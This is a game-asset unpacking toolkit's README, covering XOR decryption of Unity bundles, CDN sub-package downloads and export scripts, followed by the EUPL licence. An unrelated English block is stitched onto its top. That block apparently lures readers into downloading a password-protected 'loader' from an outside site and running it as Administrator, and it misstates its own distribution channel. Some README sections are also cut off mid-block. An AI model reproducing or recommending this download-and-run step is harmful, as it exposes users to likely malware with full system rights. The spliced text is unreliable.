<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## 0. 免责声明

本项目仅用于**个人研究、存档与格式分析**。游戏资源版权归原开发/发行方所有，
请勿将解包产物用于商业用途或再分发。仓库内**不包含**任何游戏资源文件。

---

## 1. 这套工具解决什么问题

游戏客户端由 3 个 split APK 组成，核心资源在
`split_UnityDataAssetPack.apk!assets/Bundles/Android/`：

```
assets/Bundles/Android/
├── *.ab                    普通 AssetBundle（UnityFS，XOR 加密）
├── abxxxxxzip1 ... 7       无扩展名的 ZIP，里面还是 *.ab
├── assetMapName.fb         资源路径映射
├── assetbundlemetainfo.json  bundle 清单 + MD5
├── assetbundlestateinfo.json 版本/已解压列表
└── IndependentBundles.json 独立 bundle 列表
```

皮肤、活动等内容不在首包，而在停服前仍可访问的 CSnap 子包 CDN 上：

```
## 2. 环境

- Python **3.10+**（开发时使用 3.14）
- 依赖见 `requirements.txt`：

```bash
python -m venv .venv
# Windows: .venv\Scripts\activate
# Linux/macOS: source .venv/bin/activate
pip install -r requirements.txt
```

主要依赖：

| 包 | 用途 |
|---|---|
| `UnityPy` | 解析 UnityFS、导出 Mesh/Texture/TextAsset |
| `requests` | 下载 CDN 子包 |
| `Pillow` | 贴图转 PNG（UnityPy 的依赖） |
| `flatbuffers` | 读取 `.fb` 清单（可选，`parse_subpackage_fb.py` 为无 schema 解析） |

---

## 3. 目录约定

脚本默认从**当前工作目录**读取输入、写出结果。推荐布局：

```
<project>/
├── apk/                       # 放入 base.apk / split_*.apk
├── work/
│   ├── bundles_encrypted/     # unpack_apk.py 产出
│   ├── bundles_decrypted/     # 解密后的明文
│   ├── exported/              # 导出的资源
│   ├── subpackage/            # 下载的 .subpackage_segment
│   └── subpackage_bundles/    # 切分后的 bundle
└── scripts/                   # 本工具包
```

所有脚本都接受显式路径参数，不依赖固定目录名。

---

## 4. 快速开始

### 4.0 环境自检

```bash
python scripts/check_env.py
```

会打印 Python 版本、UnityPy / requests / Pillow 版本，并用一组构造的
明文/密文验证 XOR 核心（`UnityFS\0` ↔ `MAGIC`、循环密钥、MAGIC 守卫）。
退出码 0 才继续下一步。

> ⚠️ `decrypt.py` 里的 `decrypt(path)` 是**原地覆写**文件。
> 使用前请先复制一份原始 APK / bundle，或直接用 `unpack_apk.py`（它会写到新目录）。

### 4.1 解包 APK

```bash
python scripts/unpack_apk.py \
  --apk apk/split_UnityDataAssetPack.apk \
  --out work/
```

产出：

- `work/bundles_encrypted/`：APK 原始提取物（含内层 ZIP 拆出的 `.ab`）
- `work/bundles_decrypted/`：XOR 解密后的明文 UnityFS

### 4.2 建立索引（可选，但强烈建议）

```bash
python scripts/index_bundles.py \
  --bundles work/bundles_decrypted \
  --out work/_index.jsonl
```

每行一个 bundle 的对象清单，便于先检索 container 路径再决定导出什么。

### 4.3 导出资源

```bash
python scripts/export_bundles.py \
  --bundles work/bundles_decrypted \
  --out work/exported
```

| Unity 类型 | 输出 |
|---|---|
| `Texture2D` / `Sprite` / `Cubemap` | `.png` |
| `Mesh` | `.obj` |
| `TextAsset` | 原始字节（`.bytes` / `.txt` / `.json` …） |
| `Font` | `.ttf` |
| `Shader` / `ComputeShader` | `.shader` |
| `Material` / `AnimationClip` / `MonoBehaviour` / `SpriteAtlas` | `.json`（typetree） |

### 4.4 下载并解包子包（皮肤等）

前置：从 APK 取出

- `assets/Assets/CSnapAssetSetting/HotfixLocalConfig.json`
- `assets/Assets/CSnapAssetSetting/SubpackageBundleInfo.fb`

```bash
# 1) 解析子包清单
python scripts/parse_subpackage_fb.py \
  --fb SubpackageBundleInfo.fb \
  --out work/subpackage_info.json

# 2) 按关键词下载（例如所有 m1895 子包）
python scripts/dl_subpackage.py \
  --config HotfixLocalConfig.json \
  --info work/subpackage_info.json \
  --out work/subpackage/ \
  --match m1895

# 3) 切分 + 解密
python scripts/split_subpackage.py \
  --segments work/subpackage/ \
  --info work/subpackage_info.json \
  --out work/subpackage_bundles/

# 4) 导出（自动补齐跨 bundle 依赖）
python scripts/export_subpackage.py \
  --bundles work/subpackage_bundles/ \
  --info work/subpackage_info.json \
  --deps work/subpackage_info_deps.json \
  --out work/exported_subpackage/ \
  --match m1895
```

---

## 5. 脚本清单

| 脚本 | 作用 |
|---|---|
| `check_env.py` | 环境自检：依赖、版本、XOR 核心正确性 |
| `decrypt.py` | XOR 解密核心（来自 gffcdl，已修复返回值问题） |
| `unpack_apk.py` | 从 split APK 提取 bundles、拆内层 ZIP、批量解密 |
| `index_bundles.py` | 为 bundle 建立对象索引 JSONL |
| `export_bundles.py` | 通用资源导出（贴图/网格/文本/材质/动画） |
| `parse_subpackage_fb.py` | 无 schema 解析 `SubpackageBundleInfo.fb` |
| `dl_subpackage.py` | 从 CDN 按 tag 下载 `.subpackage_segment` |
| `split_subpackage.py` | 按魔数切分多 bundle 段并逐段解密 |
| `export_subpackage.py` | 子包资源导出，自动解析 CAB 跨 bundle 依赖 |

---

## 6. 验证方法

1. **解密是否正确**：明文前 8 字节应为 `UnityFS\0`。
2. **段切分是否正确**：每个 bundle 的 header 声明大小应等于实际字节数
   （`split_subpackage.py` 会打印异常）。
3. **对象是否完整**：`index_bundles.py` 的 `objects` 总数应与
   `assetbundlemetainfo.json` 的清单规模同量级；解析错误应为 0。
4. **导出是否可用**：OBJ 用 Blender 打开、PNG 用看图工具打开、JSON 能被 `jq` 解析。

---

## 7. 已知限制

- **RGBAHalf 贴图**：UnityPy/Pillow 无法把 `TextureFormat=17 (RGBAHalf)` 直接转 PNG，
  会报 `ValueError: bytes must be in range(0, 256)`。原始数据仍在 bundle 内，
  可用 `struct.unpack('<e')` 自行转 16-bit/float TIFF。
- **依赖闭包**：某些皮肤 bundle 的 Mesh PPtr 指向另一个 bundle 的 CAB，
  必须按 `SerializedFile.externals` 的 CAB 名补齐，否则 Mesh 会缺失。
- **版本差异**：不同客户端版本的 bundle 文件名/内容会变化，比对时以
  container 路径 + 对象哈希为准，不要只看文件名。
- **停服**：CDN 可能随时下线，重要资源请及时本地备份。

---

## 8. 致谢与许可

### 8.1 致谢

- **黑卡蒂工作室（Hecate Studio）**——《少女前线：火力控制》的开发团队。
  本工具包只是解析他们做出来的东西；所有游戏资源版权归工作室与原发行方所有。
- **在 Internet Archive 上传 `GFLFC_resourcepack_202606` 备份的玩家**——
  这份关服前导出的完整运行数据（1506 个 bundle），是本项目验证"CDN 备份是否完整"
  的基准，也补上了客户端首包缺失的全部热更内容。原地址：
### 8.2 相关链接

| 内容 | 地址 |
|---|---|
### 8.3 许可

- XOR 密钥与初始解密实现来自 **gffcdl**（作者 Neptuwunium，EUPL-1.2）：
## 9. 关于 AI 辅助开发

本仓库是在 **AI 编程助手**（agent 形态的 AI coding，运行在本机，可读写文件、
执行命令、跑调试器）深度参与下完成的。为了对使用者诚实，这里把边界说清楚：

**AI 做了什么**

- 阅读 `assets/Bundles/Android/` 下的清单文件，定位加密方式与密钥来源；
- 反推 `.subpackage_segment` 的真实结构（多段 UnityFS 串联，而非 ZIP），
  并写出按魔数切分 + 逐段解密的实现；
- 在没有 FlatBuffers schema 的情况下，通过 vtable 偏移定向解析
  `SubpackageBundleInfo.fb`；
- 编写全部脚本、跑通 222 个 CDN 子包的下载/解密/导出，
  并根据导出失败的具体报错逐个修正（跨 bundle PPtr、RGBAHalf、重名覆盖等）；
- 整理本文档与 `docs/` 下的格式说明、操作流程、实测记录。

**人做了什么**

- 提供样本、账号环境与目标（"把仍能下载的角色资源完整备份下来"）；
- 判断哪些产出可用、哪些需要重做，决定取舍（例如最终放弃硬链接方案）；
- 复核 AI 的结论，并在真实设备上验证导出物能正常打开。

**这意味着什么**

- 脚本与文档中的每一个数字（bundle 数、对象数、字节数、MD5）都来自实际执行，
  不是推测；`docs/notes.md` 里连踩过的坑都保留了。
- AI 会犯错，本仓库的修错过程同样记录在案（`decrypt.py` 的返回值 bug、
  子包格式的误判、RGBAHalf 的失败路径），可以当作"AI 辅助逆向"的样本参考。
- 仓库不含任何游戏资源，也不含账号、设备、CDN token 等信息。

## 10. 许可

本仓库整体按 **EUPL-1.2** 发布（`LICENSE`），以兼容上游 gffcdl 的许可。


---

EUROPEAN UNION PUBLIC LICENCE v. 1.2
EUPL © the European Union 2007, 2016

This European Union Public Licence (the ‘EUPL’) applies to the Work (as defined below) which is provided under the
terms of this Licence. Any use of the Work, other than as authorised under this Licence is prohibited (to the extent such
use is covered by a right of the copyright holder of the Work).
The Work is provided under the terms of this Licence when the Licensor (as defined below) has placed the following
notice immediately following the copyright notice for the Work:
                          Licensed under the EUPL
or has expressed by any other means his willingness to license under the EUPL.

1.Definitions
In this Licence, the following terms have the following meaning:
— ‘The Licence’:this Licence.
— ‘The Original Work’:the work or software distributed or communicated by the Licensor under this Licence, available
as Source Code and also as Executable Code as the case may be.
— ‘Derivative Works’:the works or software that could be created by the Licensee, based upon the Original Work or
modifications thereof. This Licence does not define the extent of modification or dependence on the Original Work
required in order to classify a work as a Derivative Work; this extent is determined by copyright law applicable in
the country mentioned in Article 15.
— ‘The Work’:the Original Work or its Derivative Works.
— ‘The Source Code’:the human-readable form of the Work which is the most convenient for people to study and
modify.
— ‘The Executable Code’:any code which has generally been compiled and which is meant to be interpreted by
a computer as a program.
— ‘The Licensor’:the natural or legal person that distributes or communicates the Work under the Licence.
— ‘Contributor(s)’:any natural or legal person who modifies the Work under the Licence, or otherwise contributes to
the creation of a Derivative Work.
— ‘The Licensee’ or ‘You’:any natural or legal person who makes any usage of the Work under the terms of the
Licence.
— ‘Distribution’ or ‘Communication’:any act of selling, giving, lending, renting, distributing, communicating,
transmitting, or otherwise making available, online or offline, copies of the Work or providing access to its essential
functionalities at the disposal of any other natural or legal person.

2.Scope of the rights granted by the Licence
The Licensor hereby grants You a worldwide, royalty-free, non-exclusive, sublicensable licence to do the following, for
the duration of copyright vested in the Original Work:
— use the Work in any circumstance and for all usage,
— reproduce the Work,
— modify the Work, and make Derivative Works based upon the Work,
— communicate to the public, including the right to make available or display the Work or copies thereof to the public
and perform publicly, as the case may be, the Work,
— distribute the Work or copies thereof,
— lend and rent the Work or copies thereof,
— sublicense rights in the Work or copies thereof.
Those rights can be exercised on any media, supports and formats, whether now known or later invented, as far as the
applicable law permits so.
In the countries where moral rights apply, the Licensor waives his right to exercise his moral right to the extent allowed
by law in order to make effective the licence of the economic rights here above listed.
The Licensor grants to the Licensee royalty-free, non-exclusive usage rights to any patents held by the Licensor, to the
extent necessary to make use of the rights granted on the Work under this Licence.

3.Communication of the Source Code
The Licensor may provide the Work either in its Source Code form, or as Executable Code. If the Work is provided as
Executable Code, the Licensor provides in addition a machine-readable copy of the Source Code of the Work along with
each copy of the Work that the Licensor distributes or indicates, in a notice following the copyright notice attached to
the Work, a repository where the Source Code is easily and freely accessible for as long as the Licensor continues to
distribute or communicate the Work.

4.Limitations on copyright
Nothing in this Licence is intended to deprive the Licensee of the benefits from any exception or limitation to the
exclusive rights of the rights owners in the Work, of the exhaustion of those rights or of other applicable limitations
thereto.

5.Obligations of the Licensee
The grant of the rights mentioned above is subject to some restrictions and obligations imposed on the Licensee. Those
obligations are the following:

Attribution right: The Licensee shall keep intact all copyright, patent or trademarks notices and all notices that refer to
the Licence and to the disclaimer of warranties. The Licensee must include a copy of such notices and a copy of the
Licence with every copy of the Work he/she distributes or communicates. The Licensee must cause any Derivative Work
to carry prominent notices stating that the Work has been modified and the date of modification.

Copyleft clause: If the Licensee distributes or communicates copies of the Original Works or Derivative Works, this
Distribution or Communication will be done under the terms of this Licence or of a later version of this Licence unless
the Original Work is expressly distributed only under this version of the Licence — for example by communicating
‘EUPL v. 1.2 only’. The Licensee (becoming Licensor) cannot offer or impose any additional terms or conditions on the
Work or Derivative Work that alter or restrict the terms of the Licence.

Compatibility clause: If the Licensee Distributes or Communicates Derivative Works or copies thereof based upon both
the Work and another work licensed under a Compatible Licence, this Distribution or Communication can be done
under the terms of this Compatible Licence. For the sake of this clause, ‘Compatible Licence’ refers to the licences listed
in the appendix attached to this Licence. Should the Licensee's obligations under the Compatible Licence conflict with
his/her obligations under this Licence, the obligations of the Compatible Licence shall prevail.

Provision of Source Code: When distributing or communicating copies of the Work, the Licensee will provide
a machine-readable copy of the Source Code or indicate a repository where this Source will be easily and freely available
for as long as the Licensee continues to distribute or communicate the Work.
Legal Protection: This Licence does not grant permission to use the trade names, trademarks, service marks, or names
of the Licensor, except as required for reasonable and customary use in describing the origin of the Work and
reproducing the content of the copyright notice.

6.Chain of Authorship
The original Licensor warrants that the copyright in the Original Work granted hereunder is owned by him/her or
licensed to him/her and that he/she has the power and authority to grant the Licence.
Each Contributor warrants that the copyright in the modifications he/she brings to the Work are owned by him/her or
licensed to him/her and that he/she has the power and authority to grant the Licence.
Each time You accept the Licence, the original Licensor and subsequent Contributors grant You a licence to their contributions
to the Work, under the terms of this Licence.

7.Disclaimer of Warranty
The Work is a work in progress, which is continuously improved by numerous Contributors. It is not a finished work
and may therefore contain defects or ‘bugs’ inherent to this type of development.
For the above reason, the Work is provided under the Licence on an ‘as is’ basis and without warranties of any kind
concerning the Work, including without limitation merchantability, fitness for a particular purpose, absence of defects or
errors, accuracy, non-infringement of intellectual property rights other than copyright as stated in Article 6 of this
Licence.
This disclaimer of warranty is an essential part of the Licence and a condition for the grant of any rights to the Work.

8.Disclaimer of Liability
Except in the cases of wilful misconduct or damages directly caused to natural persons, the Licensor will in no event be
liable for any direct or indirect, material or moral, damages of any kind, arising out of the Licence or of the use of the
Work, including without limitation, damages for loss of goodwill, work stoppage, computer failure or malfunction, loss
of data or any commercial damage, even if the Licensor has been advised of the possibility of such damage. However,
the Licensor will be liable under statutory product liability laws as far such laws apply to the Work.

9.Additional agreements
While distributing the Work, You may choose to conclude an additional agreement, defining obligations or services
consistent with this Licence. However, if accepting obligations, You may act only on your own behalf and on your sole
responsibility, not on behalf of the original Licensor or any other Contributor, and only if You agree to indemnify,
defend, and hold each Contributor harmless for any liability incurred by, or claims asserted against such Contributor by
the fact You have accepted any warranty or additional liability.

10.Acceptance of the Licence
The provisions of this Licence can be accepted by clicking on an icon ‘I agree’ placed under the bottom of a window
displaying the text of this Licence or by affirming consent in any other similar way, in accordance with the rules of
applicable law. Clicking on that icon indicates your clear and irrevocable acceptance of this Licence and all of its terms
and conditions.
Similarly, you irrevocably accept this Licence and all of its terms and conditions by exercising any rights granted to You
by Article 2 of this Licence, such as the use of the Work, the creation by You of a Derivative Work or the Distribution
or Communication by You of the Work or copies thereof.

11.Information to the public
In case of any Distribution or Communication of the Work by means of electronic communication by You (for example,
by offering to download the Work from a remote location) the distribution channel or media (for example, a website)
must at least provide to the public the information requested by the applicable law regarding the Licensor, the Licence
and the way it may be accessible, concluded, stored and reproduced by the Licensee.

12.Termination of the Licence
The Licence and the rights granted hereunder will terminate automatically upon any breach by the Licensee of the terms
of the Licence.
Such a termination will not terminate the licences of any person who has received the Work from the Licensee under
the Licence, provided such persons remain in full compliance with the Licence.

13.Miscellaneous
Without prejudice of Article 9 above, the Licence represents the complete agreement between the Parties as to the
Work.
If any provision of the Licence is invalid or unenforceable under applicable law, this will not affect the validity or
enforceability of the Licence as a whole. Such provision will be construed or reformed so as necessary to make it valid
and enforceable.
The European Commission may publish other linguistic versions or new versions of this Licence or updated versions of
the Appendix, so far this is required and reasonable, without reducing the scope of the rights granted by the Licence.
New versions of the Licence will be published with a unique version number.
All linguistic versions of this Licence, approved by the European Commission, have identical value. Parties can take
advantage of the linguistic version of their choice.

14.Jurisdiction
Without prejudice to specific agreement between parties,
— any litigation resulting from the interpretation of this License, arising between the European Union institutions,
bodies, offices or agencies, as a Licensor, and any Licensee, will be subject to the jurisdiction of the Court of Justice
of the European Union, as laid down in article 272 of the Treaty on the Functioning of the European Union,
— any litigation arising between other parties and resulting from the interpretation of this License, will be subject to
the exclusive jurisdiction of the competent court where the Licensor resides or conducts its primary business.

15.Applicable Law
Without prejudice to specific agreement between parties,
— this Licence shall be governed by the law of the European Union Member State where the Licensor has his seat,
resides or has his registered office,
— this licence shall be governed by Belgian law if the Licensor has no seat, residence or registered office inside
a European Union Member State.


                                                         Appendix

‘Compatible Licences’ according to Article 5 EUPL are:
— GNU General Public License (GPL) v. 2, v. 3
— GNU Affero General Public License (AGPL) v. 3
— Open Software License (OSL) v. 2.1, v. 3.0
— Eclipse Public License (EPL) v. 1.0
— CeCILL v. 2.0, v. 2.1
— Mozilla Public Licence (MPL) v. 2
— GNU Lesser General Public Licence (LGPL) v. 2.1, v. 3
— Creative Commons Attribution-ShareAlike v. 3.0 Unported (CC BY-SA 3.0) for works other than software
— European Union Public Licence (EUPL) v. 1.1, v. 1.2
— Québec Free and Open-Source Licence — Reciprocity (LiLiQ-R) or Strong Reciprocity (LiLiQ-R+).

The European Commission may update this Appendix to later versions of the above licences without producing
a new version of the EUPL, as long as they provide the rights granted in Article 2 of this Licence and protect the
covered Source Code from exclusive appropriation.
All other changes or additions to this Appendix require the production of a new EUPL version.
